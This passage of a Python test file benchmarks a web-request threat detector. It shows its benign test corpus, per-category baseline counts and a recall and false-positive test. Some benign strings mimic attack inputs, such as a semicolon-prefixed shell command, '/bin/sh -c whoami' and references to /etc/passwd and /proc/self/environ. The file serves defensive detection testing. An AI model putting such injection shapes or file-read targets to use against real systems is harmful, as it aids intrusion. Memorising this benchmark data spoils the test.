    BenignCase(
        "sensitive_file_benign_env_example",
        "See `.env.example` for the list of required environment variables.",
    ),
    BenignCase(
        "sensitive_file_benign_readme_reference",
        "Please review `README.md` before opening a PR.",
    ),
    BenignCase(
        "sensitive_file_benign_settings_yml_mention",
        "See the config file `settings.yml` for defaults.",
    ),
    BenignCase(
        "sensitive_file_benign_source_extension_prose",
        "Our backend is written in Python (`.py`) and Go (`.go`).",
    ),
    BenignCase("cms_probing_robots_txt", "/robots.txt"),
    BenignCase("cms_probing_sitemap_xml", "/sitemap.xml"),
    BenignCase("cms_probing_security_txt", "/security.txt"),
    BenignCase(
        "cms_probing_prose_wordpress_mention",
        "We migrated our blog off WordPress last year.",
    ),
    BenignCase(
        "cms_probing_prose_htaccess_backup_reminder",
        "Please back up /var/www/html/.htaccess before deploying the release.",
    ),
    BenignCase(
        "cms_probing_prose_wp_admin_config_mirror_mention",
        "Check the config under /opt/app/wp-admin/ for the legacy mirror.",
    ),
    BenignCase(
        "cms_probing_prose_support_ticket_wp_admin_link",
        "Customer sent us this link: https://shop.example.com/wp-admin/plugins.php "
        "please advise.",
    ),
    BenignCase(
        "cms_probing_prose_docs_wp_admin_link",
        "See notes at https://docs.example.com/wp-admin/setup-config.php for "
        "migration steps.",
    ),
    BenignCase("recon_robots_txt", "/robots.txt"),
    BenignCase("recon_sitemap_xml", "/sitemap.xml"),
    BenignCase("recon_security_txt", "/security.txt"),
    BenignCase(
        "recon_prose_actuator_explainer",
        "Spring Boot actuator endpoints expose health and metrics data.",
    ),
    BenignCase(
        "recon_prose_prometheus_actuator_scrape_mention",
        "Prometheus scrapes /metrics/actuator/health every 30 seconds.",
    ),
    BenignCase("recon_normal_api_route", "/api/v1/users/42"),
    BenignCase("recon_rest_route_api_version", "/api/version"),
    BenignCase("recon_rest_route_nested_system_health", "/app/system/health"),
    BenignCase("recon_rest_route_versioned_system_status", "/api/v2/system/status"),
    BenignCase(
        "proto_pollution_benign_prototype_docs",
        "JavaScript objects inherit from `Object.prototype` by default.",
    ),
    BenignCase(
        "proto_pollution_benign_constructor_mention",
        "The `constructor` property points back to the class that created "
        "the instance.",
    ),
    BenignCase(
        "proto_pollution_benign_admin_flag_json", '{"role": "admin", "active": true}'
    ),
    BenignCase(
        "proto_pollution_prose_tutorial_reference",
        "The class `__proto__` reference is used to explain JS inheritance "
        "in the tutorial.",
    ),
    BenignCase(
        "proto_pollution_benign_constructor_value",
        '{"user": {"name": "alice", "constructor": "Employee"}}',
    ),
    BenignCase("proto_pollution_benign_constructor_name_access", "a.constructor.name"),
    BenignCase("proto_pollution_benign_bare_constructor_param", "constructor"),
    BenignCase("proto_pollution_benign_bare_prototype_param", "prototype"),
    BenignCase(
        "code_injection_prose_reflection_explainer",
        "Reflection lets a program inspect its own types at runtime.",
    ),
    BenignCase(
        "code_injection_prose_process_class_mention",
        "The `Process` class in .NET wraps native OS process handles.",
    ),
    BenignCase(
        "code_injection_changelog_assembly_bump",
        "Bumped the shared `Assembly` version to 4.2.0 in this release.",
    ),
    BenignCase(
        "code_injection_prose_process_wrapper_explainer",
        "The `Process` class wraps native OS handles for spawning child processes.",
    ),
    BenignCase(
        "code_injection_prose_reflection_serialization",
        "Reflection-based serialization is slower than direct field access.",
    ),
    BenignCase(
        "benign_user_agent_chrome_windows",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ),
    BenignCase(
        "benign_user_agent_iphone_safari",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 "
        "Safari/604.1",
    ),
    BenignCase("benign_user_agent_python_requests", "python-requests/2.31.0"),
    BenignCase("benign_user_agent_curl", "curl/8.4.0"),
    BenignCase(
        "benign_git_diff_snippet",
        "diff --git a/src/utils.py b/src/utils.py\n--- a/src/utils.py\n"
        "+++ b/src/utils.py\n@@ -10,7 +10,7 @@ def parse(x):\n"
        "-    return x.strip()\n+    return x.strip().lower()",
    ),
    BenignCase(
        "benign_json_semicolon_pipe_in_value",
        '{"description": "Use semicolons; separate values with pipes | when '
        'exporting CSV.", "id": 42}',
    ),
    BenignCase(
        "benign_oauth_redirect_callback",
        "https://app.example.com/oauth/callback?code=abc123&state=xyz789",
    ),
    BenignCase(
        "benign_s3_bucket_asset_url",
        "https://my-app-assets.s3.amazonaws.com/uploads/avatar-42.png",
    ),
    BenignCase(
        "benign_cdn_jsdelivr_url",
        "https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js",
    ),
    BenignCase("benign_file_path_var_www_html", "/var/www/html/index.html"),
    BenignCase(
        "benign_webhook_payment_succeeded",
        '{"event": "payment.succeeded", "data": {"amount": 4999, "currency": "usd"}}',
    ),
    BenignCase(
        "benign_changelog_version_entry",
        "3.11.2 - Fixed a race condition in the rate limiter and updated dependencies.",
    ),
    BenignCase(
        "benign_base64_wrapped_greeting",
        "token=R29vZCBtb3JuaW5nIHRlYW0sIHN0YW5kdXAgbm90ZXMgYXR0YWNoZWQgYmVsb3cu",
        "encoding_aware",
    ),
    BenignCase(
        "benign_base64_wrapped_receipt",
        "VGhhbmsgeW91IGZvciB5b3VyIHB1cmNoYXNlLCB5b3VyIG9yZGVyIHdpbGwgc2hpcCB3"
        "aXRoaW4gdHdvIGJ1c2luZXNzIGRheXMu",
        "encoding_aware",
    ),
    BenignCase(
        "benign_base64_wrapped_changelog",
        "UmVmYWN0b3JlZCB0aGUgYmlsbGluZyBtb2R1bGUgYW5kIGNsZWFuZWQgdXAgZGVhZCBj"
        "b2RlIGluIHRoZSBpbnZvaWNlIHBpcGVsaW5lLg==",
        "encoding_aware",
    ),
    BenignCase(
        "benign_past_truncation_cutoff_closing_sentence",
        _TRUNCATION_FILLER + "the end of this long benign report is just a "
        "closing sentence.",
        "encoding_aware",
    ),
    BenignCase(
        "sensitive_file_git_diff_ending_python_source",
        "diff --git a/src/utils.py b/src/utils.py\n--- a/src/utils.py\n"
        "+++ b/src/utils.py",
    ),
    BenignCase(
        "sensitive_file_log_line_ending_dotenv",
        "2026-08-11T10:22:03Z INFO deploy: copied template into /srv/app/.env",
    ),
    BenignCase(
        "sensitive_file_dockerfile_ending_python_source",
        "FROM python:3.12-slim\nWORKDIR /app\nCOPY requirements.txt .\n"
        "RUN pip install -r requirements.txt\nCOPY app/main.py /app/main.py",
    ),
    BenignCase(
        "sensitive_file_release_note_ending_config_yml",
        "Release 3.12.0 updates the default timeout values.\nSee infra/app-config.yml",
    ),
    BenignCase(
        "sensitive_file_cdn_note_ending_sourcemap",
        "Deploy pipeline uploaded new build artifacts.\nUploaded dist/bundle.js.map",
    ),
    BenignCase(
        "sensitive_file_shell_log_ending_deploy_sh",
        "Provisioning log:\nExecuted post-install hook scripts/deploy.sh",
    ),
    BenignCase(
        "sensitive_file_release_note_ending_go_source",
        "Refactored the payments module for clarity.\n"
        "Updated services/payments/handler.go",
    ),
    BenignCase(
        "sensitive_file_changelog_ending_sql_migration",
        "3.12.0 changelog:\n- Added index on users table\n"
        "Run the migration via db/migrate.sql",
    ),
    BenignCase(
        "sensitive_file_multiline_ending_git_dir",
        "Build artifacts were generated inside a scratch checkout at /tmp/build/.git",
    ),
    BenignCase(
        "sensitive_file_json_payload_ending_source_path",
        '{"event": "file_watch", "changed": true, "path": "/opt/app/worker.py"}',
    ),
    BenignCase(
        "sensitive_file_stack_trace_ending_source_path",
        "Unhandled exception while loading configuration.\n"
        "  at bootstrap (app/bootstrap.js:12)\n"
        "  at Module._compile (module.js:456)\n"
        "Failed to load /app/config/settings.py",
    ),
    BenignCase(
        "requirements_txt_style_multiline_benign",
        "flask==3.0.3\nrequests==2.32.3\npydantic==2.9.2\nredis==5.0.8\nhttpx==0.27.2",
    ),
    BenignCase(
        "dir_traversal_incident_note_ending_etc_passwd",
        "Investigating auth issues.\nUser confirmed the target file was /etc/passwd",
    ),
    BenignCase(
        "dir_traversal_incident_note_midline_etc_passwd",
        "Investigating auth issues.\n"
        "User confirmed the target file was /etc/passwd\n"
        "Ticket resolved, closing now.",
    ),
    BenignCase(
        "dir_traversal_setup_log_ending_win_ini",
        "Setup log:\nBackup restored win.ini",
    ),
    BenignCase(
        "dir_traversal_debug_trace_ending_proc_environ",
        "Debug trace:\nDumped /proc/self/environ",
    ),
    BenignCase(
        "dir_traversal_ops_report_ending_var_log",
        "Report:\nRotated /var/log/nginx",
    ),
    BenignCase(
        "path_traversal_url_note_ending_percent2f",
        "Redirect target uses percent-encoding.\n"
        "User was redirected to %2Fadmin%2Fsettings",
    ),
    BenignCase(
        "path_traversal_changelog_ending_percent_encoded_space",
        "Release notes:\n- Fixed a bug in URL decoding\n"
        "Example input now renders as hello%20world",
    ),
    BenignCase(
        "file_inclusion_release_notes_ending_https_url",
        "3.12.0 changelog:\n- Bumped the CDN asset pipeline\n"
        "New script tag points to https://cdn.example.com/app.js",
    ),
    BenignCase(
        "file_inclusion_docs_ending_ftp_url",
        "Legacy download docs:\n"
        "Older clients should use ftp://ftp.example.com/pub/readme.txt",
    ),
    BenignCase(
        "sqli_orderby_pagination_note_multiline",
        "Migration notes:\nFor pagination consistency, always ORDER BY 2\n"
        "before paginating results.",
    ),
    BenignCase(
        "sqli_shell_comment_hash_multiline",
        "Example shell command:\necho 'debug' #\nEnables verbose output.",
    ),
    BenignCase(
        "cmd_injection_shell_script_excerpt_multiline",
        "Deployment script:\nsh -x deploy.sh\necho done",
    ),
    BenignCase(
        "cms_probing_role_list_administrator_multiline",
        "Available roles for this workspace:\nadministrator\neditor\nviewer\n"
        "Contact support for role changes.",
    ),
    BenignCase(
        "cms_probing_bullet_list_wp_admin_alone_on_line",
        "Available admin paths historically used:\nwp-admin\nRemove legacy references.",
    ),
    BenignCase(
        "cms_probing_bullet_list_htaccess_alone_on_line",
        "Files reviewed during the audit:\n.htaccess\nNo secrets found.",
    ),
    BenignCase(
        "cms_probing_deprecated_scripts_list_multiline",
        "Deprecated scripts:\ntest.php\ninfo.php\nRemove these before production.",
    ),
    BenignCase(
        "cms_probing_cleanup_backup_files_multiline",
        "Files pending cleanup:\nsettings.py.orig\ndata.tmp\n"
        "Please review before merge.",
    ),
    BenignCase(
        "cms_probing_gitignore_style_list_multiline",
        "Files to ignore in this repo:\n.DS_Store\nThumbs.db\n.npmrc\n"
        "Add more as needed.",
    ),
    BenignCase(
        "recon_retired_pages_list_multiline",
        "Legacy pages retired this quarter:\nhome.shtml\ncontact.cgi\n"
        "Reach out with questions.",
    ),
    BenignCase(
        "recon_api_routes_doc_multiline",
        "Internal routes reference:\n/version\n/health\n/metrics",
    ),
    BenignCase(
        "recon_endpoints_list_multiline",
        "Endpoints exposed by this service:\nactuator\nswagger-ui\n"
        "Remove before going to prod.",
    ),
    BenignCase(
        "recon_internal_tools_list_multiline",
        "Internal tools we use:\nconfluence\nhelpdesk\njira",
    ),
    BenignCase(
        "recon_legacy_cgi_paths_doc_multiline",
        "Legacy web server paths still referenced in docs:\n"
        "cgi-bin/old-form.cgi\nDo not use in new code.",
    ),
    BenignCase(
        "recon_iot_audit_findings_multiline",
        "IoT device audit findings:\nHNAP1\nIPCamDesc.xml\n"
        "Flagged for firmware update.",
    ),
    BenignCase(
        "recon_i18n_routes_doc_multiline",
        "Supported i18n routes:\n/languages/en\n/languages/fr\n"
        "Add more locales as needed.",
    ),
    BenignCase(
        "recon_vendor_inventory_multiline",
        "Vendor systems inventory:\nsap\nwsman\nDecommission by Q3.",
    ),
    BenignCase(
        "recon_bot_integrations_list_multiline",
        "Bot integrations enabled:\n.clawdbot\nRemove unused integrations.",
    ),
    BenignCase(
        "recon_spanish_routes_doc_multiline",
        "Spanish site routes:\n/inicio\n/indice\nTranslate remaining pages.",
    ),
    BenignCase(
        "recon_dev_tooling_folders_multiline",
        "Dev tooling folders in this repo:\n.streamlit\n.devcontainer\n"
        "Add to .gitignore.",
    ),
    BenignCase(
        "recon_build_files_pr_multiline",
        "Build files added in this PR:\nDockerfile\nMakefile\nJenkinsfile\n"
        "Ready for review.",
    ),
    BenignCase(
        "recon_removed_secrets_files_multiline",
        "Files removed for security reasons:\nold_secrets.yml\n"
        "legacy_credentials.json\nAudit complete.",
    ),
    BenignCase(
        "recon_proxy_autodiscover_paths_multiline",
        "Exchange-related paths in our proxy config:\nautodiscover/\n"
        "Do not cache these responses.",
    ),
    BenignCase(
        "recon_doh_endpoints_doc_multiline",
        "DoH endpoints supported:\n/dns-query\nSee RFC 8484 for details.",
    ),
    BenignCase(
        "recon_git_troubleshooting_note_multiline",
        "Git repo troubleshooting notes:\nCorruption found in:\n"
        ".git/objects\n.git/refs\nRan git fsck to repair.",
    ),
    BenignCase(
        "cms_probing_prose_support_ticket_plugins_reference",
        "Customer support referenced the plugins page at /wp-admin/plugins.php "
        "in their ticket.",
    ),
    BenignCase(
        "cms_probing_prose_onboarding_notes_wp_login_reference",
        "The onboarding notes mention /wp-login.php as the old staging login page.",
    ),
    BenignCase(
        "cms_probing_prose_legacy_docs_xmlrpc_reference",
        "Please review /xmlrpc.php in the legacy docs before removing it.",
    ),
    BenignCase(
        "cms_probing_prose_archive_backup_phpinfo_reference",
        "Our archive still has a backup copy of /phpinfo.php from 2019.",
    ),
    BenignCase(
        "cms_probing_prose_changelog_install_php_removal",
        "The changelog mentions removing /wp-admin/install.php from the demo site.",
    ),
    BenignCase(
        "sensitive_file_prose_audit_report_git_config_mirror",
        "See the audit report about /.git/config for the deprecated mirror repo.",
    ),
    BenignCase(
        "sensitive_file_prose_deployment_notes_dotenv_copy",
        "Deployment notes: copy /var/www/.env to the new host before cutover.",
    ),
    BenignCase(
        "dir_traversal_prose_runbook_etc_passwd_review",
        "The runbook says to check /etc/passwd for stale local accounts.",
    ),
    BenignCase(
        "cms_probing_prose_qa_htpasswd_403_confirmation",
        "QA confirmed /.htpasswd returns 403 after the hardening fix shipped.",
    ),
    BenignCase(
        "cms_probing_prose_wiki_setup_config_removal_note",
        "Please remove the old /wp-admin/setup-config.php reference from the wiki.",
    ),
    BenignCase(
        "cms_probing_prose_customer_screenshot_install_php",
        "The customer's screenshot shows /wp-admin/install.php in their browser "
        "history.",
    ),
    BenignCase(
        "cms_probing_prose_support_macro_wp_login_reset",
        "Our support macro links to /wp-login.php for password reset instructions.",
    ),
    BenignCase(
        "cms_probing_prose_migration_guide_xmlrpc_deprecated",
        "The migration guide references /xmlrpc.php as a deprecated endpoint.",
    ),
    BenignCase(
        "cms_probing_prose_internal_docs_phpinfo_deletion_list",
        "Internal docs list /phpinfo.php among files scheduled for deletion.",
    ),
    BenignCase(
        "sensitive_file_prose_infra_backup_dotenv_rotation",
        "The infra team backed up /var/www/.env before rotating credentials.",
    ),
    BenignCase(
        "sensitive_file_prose_git_config_purge_confirmation",
        "Please confirm /.git/config was purged from the old snapshot.",
    ),
    BenignCase(
        "cms_probing_prose_vendor_setup_wizard_reference",
        "The vendor's setup wizard used to live at /wp-admin/setup-config.php.",
    ),
    BenignCase(
        "cms_probing_prose_style_guide_plugins_example_url",
        "Our style guide references /wp-admin/plugins.php as an example URL.",
    ),
    BenignCase(
        "dir_traversal_prose_ops_notes_etc_passwd_audit",
        "Ops notes: /etc/passwd was reviewed during the compliance audit.",
    ),
    BenignCase(
        "cms_probing_prose_training_video_wp_login_demo",
        "The training video walks through /wp-login.php on the demo instance.",
    ),
    BenignCase(
        "cms_probing_prose_decommissioned_server_install_php_archive",
        "Please archive /wp-admin/install.php from the decommissioned server.",
    ),
    BenignCase(
        "cms_probing_prose_knowledge_base_xmlrpc_explainer",
        "The knowledge base article explains what /xmlrpc.php used to do.",
    ),
    BenignCase(
        "cms_probing_prose_legacy_monitoring_phpinfo_sandbox",
        "Legacy monitoring still polls /phpinfo.php on the sandbox environment.",
    ),
    BenignCase(
        "cms_probing_prose_support_ticket_htpasswd_auth_setup",
        "Support ticket #4821 mentions /.htpasswd as part of the old auth setup.",
    ),
    BenignCase(
        "cms_probing_prose_release_notes_setup_config_removed",
        "The release notes say /wp-admin/setup-config.php was removed in 3.9.",
    ),
    BenignCase(
        "cms_probing_prose_customer_sitemap_install_php_question",
        "Customer asked why /wp-admin/install.php still shows up in their sitemap.",
    ),
    BenignCase(
        "sensitive_file_prose_onboarding_wiki_dotenv_example",
        "The wiki page for onboarding references /var/www/.env as an example path.",
    ),
    BenignCase(
        "dir_traversal_prose_postmortem_etc_passwd_glossary",
        "Our postmortem doc mentions /etc/passwd only as a glossary term.",
    ),
    BenignCase(
        "cms_probing_prose_vendor_docs_xmlrpc_sample_requests",
        "The vendor documentation still shows /xmlrpc.php in its sample requests.",
    ),
    BenignCase(
        "sensitive_file_prose_public_bucket_git_config_exclusion",
        "Please double check /.git/config was excluded from the public bucket.",
    ),
    BenignCase(
        "cms_probing_prose_design_review_wp_login_mockup",
        "The design review referenced /wp-login.php as a UI mockup source.",
    ),
    BenignCase(
        "cms_probing_prose_historical_changelog_phpinfo_retirement",
        "Historical changelog: /phpinfo.php was retired from the staging tier.",
    ),
    BenignCase(
        "cms_probing_prose_teardown_script_install_php_fixtures",
        "The teardown script deletes /wp-admin/install.php from test fixtures.",
    ),
    BenignCase(
        "cms_probing_prose_customer_faq_plugins_not_public",
        "Customer FAQ explains that /wp-admin/plugins.php is no longer public.",
    ),
    BenignCase(
        "sensitive_file_prose_compliance_checklist_dotenv_audit_trail",
        "The compliance checklist references /var/www/.env for the audit trail.",
    ),
    BenignCase(
        "cmd_injection_semicolon_prefixed_deploy_script_flag",
        "; ./deploy.sh -f",
    ),
    BenignCase(
        "cmd_injection_bare_run_script_flag",
        "scripts/run.sh -v",
    ),
    BenignCase(
        "cmd_injection_prose_lint_script_flag_reminder",
        "Run ./scripts/lint.sh -v before pushing.",
    ),
    BenignCase(
        "rest_path_k8s_default_namespace_bare",
        "/api/v1/namespaces/default",
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_quoted_absolute_shell_ls",
        "First run setup; /bin/sh -c 'ls' to verify.",
        "production",
        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_quoted_absolute_shell_whoami",
        "ticket note: reproduced by running commands; /bin/sh -c whoami showed root",
        "production",
        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_quoted_env_prefixed_shell",
        "runbook step 3: restart the shell; /usr/bin/env bash -c "
        "'systemctl restart app'",
        "production",
        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_quoted_absolute_shell_debug_flag",
        "changelog: fixed default login; /bin/sh -x debug.sh now traces correctly",
        "production",
        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_bare_shell_control",
        "First run setup; sh -c 'ls' to verify.",
        "production",
        _SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_value_absolute_shell_c_npm_start",
        "/bin/sh -c 'npm start'",
        "production",
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_value_absolute_bash_login_flag",
        "/bin/bash -l",
        "production",
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_value_env_prefixed_bash_c_echo",
        "/usr/bin/env bash -c 'echo hi'",
        "production",
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_value_bare_shell_control",
        "sh -c 'npm start'",
        "production",
        _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
    ),
    BenignCase(
        "ldap_glob_paren_null_mention",
        "glob pattern: *)%00 in filenames",
    ),
    BenignCase(
        "cmd_injection_sql_update_set_equals_backtick",
        "UPDATE t SET a=`b` WHERE id=1",
    ),
    BenignCase(
        "cmd_injection_query_string_equals_ampersand_backtick",
        "sort=`created_at`&order=asc",
    ),
    BenignCase(
        "cmd_injection_query_string_ampersand_equals_backtick",
        "a=1&`b`=2",
    ),
    BenignCase(
        "cmd_injection_assignment_equals_backtick_value",
        "value=`cmd`",
    ),
    BenignCase(
        "cmd_injection_url_query_param_equals_backtick",
        "https://example.com/search?q=`test`",
    ),
    BenignCase(
        "cmd_injection_sql_select_from_no_space_backtick",
        "SELECT`id`FROM users",
    ),
    BenignCase(
        "cmd_injection_json_expr_equals_backtick",
        '{"expr": "x=`y`"}',
    ),
    BenignCase(
        "cmd_injection_cjk_chinese_backtick_curl_mention",
        "请使用`curl`命令下载文件",
    ),
    BenignCase(
        "cmd_injection_cjk_japanese_backtick_npm_mention",
        "実行するには`npm`を使ってください",
    ),
    BenignCase(
        "cmd_injection_cjk_korean_backtick_id_mention",
        "사용법은`id`명령을 참고하세요",
    ),
    BenignCase(
        "cmd_injection_glued_kebab_identifier_header_forward",
        "header`x-forwarded-for`value",
    ),
    BenignCase(
        "cmd_injection_glued_kebab_identifier_config_well_known",
        "config`well-known`here",
    ),
    BenignCase(
        "cmd_injection_glued_plausible_token_ref_user_list",
        "ref`user`list",
    ),
    BenignCase(
        "cmd_injection_jquery_selector_bare_id_call",
        "$(id).addClass('active');",
    ),
    BenignCase(
        "cmd_injection_jquery_selector_hash_id_call",
        "$('#submit-button').on('click', handleSubmit);",
    ),
    BenignCase(
        "cmd_injection_js_template_dotted_prop",
        "const label = `Welcome ${obj.prop}`;",
    ),
    BenignCase(
        "cmd_injection_js_template_bare_var_brace",
        "const path = `/users/${id}`;",
    ),
    BenignCase(
        "xss_prose_bare_on_word_assignment_no_tag",
        "changelog: onboarding=complete and onward=next for the release",
    ),
    BenignCase(
        "ssrf_email_userinfo_localhost_domain_no_scheme",
        "System alerts are emailed to root@localhost by the nightly cron job.",
    ),
    BenignCase("ssrf_userinfo_email_style_public_domain", "user@example.com"),
    BenignCase(
        "xss_href_quoted_onboarding_path_slash_sep",
        '<a href="/onboarding">Get started</a>',
    ),
    BenignCase(
        "xss_src_quoted_only_prefixed_path_slash_sep",
        '<img src="/only-in-stock.png" alt="badge">',
    ),
    BenignCase(
        "xss_href_quoted_once_prefixed_path_slash_sep",
        '<link rel="stylesheet" href="/once-cache.css">',
    ),
    BenignCase("template_benign_curly_user_name", "{{ user.name }}"),
    BenignCase("template_benign_curly_title", "{{ title }}"),
    BenignCase("template_benign_curly_count", "{{ count }}"),
    BenignCase("template_benign_hash_brand_color", "#{brandColor}"),
    BenignCase("template_benign_hash_user_name", "#{user.name}"),
    BenignCase(
        "template_fp_date_curly_brace",
        "{{ 2024-01-02 }}",
        "production",
        _SSTI_DATE_IN_BRACES_KNOWN_FP_REASON,
    ),
    BenignCase(
        "template_fp_date_hash_brace",
        "#{2024-12-31}",
        "production",
        _SSTI_DATE_IN_BRACES_KNOWN_FP_REASON,
    ),
    BenignCase(
        "template_fp_call_branch_format_x",
        "{{ format(x) }}",
        "production",
        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
    ),
    BenignCase(
        "template_fp_call_branch_round_filter",
        "{{ item.price | round(2) }}",
        "production",
        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
    ),
    BenignCase(
        "template_fp_call_branch_helper_format",
        "#{ helper.format(value) }",
        "production",
        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
    ),
    BenignCase(
        "template_fp_call_branch_map_arrow",
        "{{ cart.items.map(item => item.price) }}",
        "production",
        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
    ),
    BenignCase("ssrf_benign_single_at_token_userinfo", "https://token@api.example.com"),
    BenignCase("ssrf_benign_single_at_userpass", "http://user:pass@host.com"),
    BenignCase("ssrf_benign_email_param", "email=a@b.com"),
    BenignCase("sensitive_file_benign_leading_tilde_home", "~/home"),
    BenignCase("sensitive_file_benign_bare_tilde_user", "~user"),
    BenignCase(
        "sensitive_file_benign_midstring_tilde_report",
        "/files/report~draft.txt",
    ),
    BenignCase("sqli_benign_multi_value_semicolon_pair", "a=1;b=2"),
    BenignCase("sqli_benign_sort_order_semicolon_pair", "sort=name;order=asc"),
    BenignCase("sqli_benign_semicolon_select_no_from", "; select all options"),
    BenignCase("sqli_benign_semicolon_update_no_set", "note; update your profile"),
    BenignCase("sqli_benign_semicolon_execute_no_proc", "; execute the plan"),
    BenignCase("sqli_benign_exec_bareword_call_shape", "execute report()"),
    BenignCase("sqli_benign_exec_qualified_proc_name", "EXEC dbo.Proc()"),
]

BASELINE_MALICIOUS_DETECTED_BY_CATEGORY: dict[str, int] = {
    "cmd_injection": 45,
    "cms_probing": 10,
    "code_injection": 3,
    "deserialization": 12,
    "dir_traversal": 8,
    "file_inclusion": 8,
    "file_upload": 22,
    "http_split": 4,
    "ldap": 12,
    "nosql": 10,
    "path_traversal": 5,
    "proto_pollution": 8,
    "recon": 23,
    "sensitive_file": 11,
    "sqli": 27,
    "ssrf": 28,
    "template": 13,
    "xml": 4,
    "xss": 19,
}
BASELINE_MALICIOUS_DETECTED_TOTAL = 272

BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY: dict[str, int] = {
    "cmd_injection": 9,
    "file_inclusion": 6,
    "template": 6,
}
BASELINE_BENIGN_FALSE_POSITIVE_TOTAL = 21

_WALL_TIME_CEILING_SECONDS = 30.0


def _malicious_case_detected_categories(
    case: MaliciousCase, detectors: dict[str, SusPatternsManager]
) -> set[str]:
    detector = detectors[case.detector]
    result = detector.detect(
        content=case.payload, ip_address="203.0.113.9", context="request_body"
    )
    if not result["is_threat"]:
        return set()
    return {threat.get("category") for threat in result["threats"]}


def _benign_case_flagged_categories(
    case: BenignCase, detectors: dict[str, SusPatternsManager]
) -> set[str]:
    detector = detectors[case.detector]
    result = detector.detect(
        content=case.payload, ip_address="198.51.100.4", context="request_body"
    )
    if not result["is_threat"]:
        return set()
    return {threat.get("category") for threat in result["threats"]}


def _fraction(numerator: int, denominator: int) -> str:
    percentage = 100.0 * numerator / denominator if denominator else 0.0
    return f"{numerator}/{denominator} ({percentage:.1f}%)"


def _build_report(
    malicious_detected_by_category: dict[str, int],
    malicious_total_by_category: dict[str, int],
    benign_flagged_by_category: dict[str, int],
    benign_total: int,
    malicious_detected_total: int,
    malicious_total: int,
    benign_flagged_total: int,
    wall_time_seconds: float,
) -> str:
    lines = [
        "DETECTION BENCHMARK REPORT",
        f"malicious corpus: {malicious_total} cases across "
        f"{len(malicious_total_by_category)} categories, "
        f"{sum(1 for c in MALICIOUS_CORPUS if c.known_gap_reason)} documented "
        "known gaps",
        f"benign corpus: {benign_total} cases, "
        f"{sum(1 for c in BENIGN_CORPUS if c.known_false_positive_reason)} "
        "documented known false positives",
        f"wall time: {wall_time_seconds:.3f}s",
        "",
        "per-category recall (detected/total):",
    ]
    for category in sorted(malicious_total_by_category):
        detected = malicious_detected_by_category.get(category, 0)
        total = malicious_total_by_category[category]
        lines.append(f"  {category:16} {_fraction(detected, total)}")
    lines.append("")
    lines.append("per-category false-positive attribution (benign hits/total benign):")
    for category in sorted(ALL_DETECTION_CATEGORIES):
        flagged = benign_flagged_by_category.get(category, 0)
        lines.append(f"  {category:16} {_fraction(flagged, benign_total)}")
    lines.append("")
    lines.append(
        f"total recall:    {_fraction(malicious_detected_total, malicious_total)}"
    )
    lines.append(f"total fp rate:   {_fraction(benign_flagged_total, benign_total)}")
    lines.append("")
    lines.append("known gaps (documented, still counted in the denominator):")
    for malicious_case in MALICIOUS_CORPUS:
        if malicious_case.known_gap_reason:
            lines.append(
                f"  {malicious_case.case_id} [{malicious_case.category}]: "
                f"{malicious_case.known_gap_reason}"
            )
    lines.append("")
    lines.append(
        "known false positives (documented, still counted in the denominator):"
    )
    for benign_case in BENIGN_CORPUS:
        if benign_case.known_false_positive_reason:
            lines.append(
                f"  {benign_case.case_id}: {benign_case.known_false_positive_reason}"
            )
    return "\n".join(lines)


def test_detection_benchmark_recall_and_false_positive_rate() -> None:
    assert len(MALICIOUS_CORPUS) >= 120
    assert len(BENIGN_CORPUS) >= 120
    assert len(MALICIOUS_CORPUS) == len(
        {malicious_case.case_id for malicious_case in MALICIOUS_CORPUS}
    )
    assert len(BENIGN_CORPUS) == len(
        {benign_case.case_id for benign_case in BENIGN_CORPUS}
    )
    assert {
        malicious_case.category for malicious_case in MALICIOUS_CORPUS
    } == ALL_DETECTION_CATEGORIES
    assert set(BASELINE_MALICIOUS_DETECTED_BY_CATEGORY) == ALL_DETECTION_CATEGORIES

    start = time.monotonic()

    malicious_detected_by_category: dict[str, int] = {}
    malicious_total_by_category: dict[str, int] = {}
    undetected_case_ids_by_category: dict[str, list[str]] = {}
    for malicious_case in MALICIOUS_CORPUS:
        malicious_total_by_category[malicious_case.category] = (
            malicious_total_by_category.get(malicious_case.category, 0) + 1
        )
        hit_categories = _malicious_case_detected_categories(malicious_case, _DETECTORS)
        if malicious_case.category in hit_categories:
            malicious_detected_by_category[malicious_case.category] = (
                malicious_detected_by_category.get(malicious_case.category, 0) + 1
            )
        else:
            undetected_case_ids_by_category.setdefault(
                malicious_case.category, []
            ).append(malicious_case.case_id)

    benign_flagged_by_category: dict[str, int] = {}
    benign_flagged_total = 0
    unexpected_false_positive_case_ids: list[str] = []
    for benign_case in BENIGN_CORPUS:
        hit_categories = _benign_case_flagged_categories(benign_case, _DETECTORS)
        if hit_categories:
            benign_flagged_total += 1
            if not benign_case.known_false_positive_reason:
                unexpected_false_positive_case_ids.append(benign_case.case_id)
